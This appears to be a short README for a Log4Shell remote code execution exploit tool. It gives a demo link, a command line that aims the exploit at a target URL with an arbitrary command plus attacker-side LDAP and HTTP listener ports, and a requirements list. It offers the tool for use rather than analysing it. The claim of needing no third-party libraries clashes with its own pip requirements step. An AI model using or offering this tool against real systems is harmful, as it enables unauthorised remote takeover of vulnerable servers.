## Log4Shell RCE Exploit - fully independent exploit does not require any 3rd party libs.

[![asciicast](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj.svg)](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj)

### Usage
```shell
python main.py -i lhost -u http://target:targetport -c "command_to_execute" -p lhttp_port -l lldap_port
 ```


### Requirements 
- java-8-openjdk
- pip install -r requirements.txt
- python3.6+



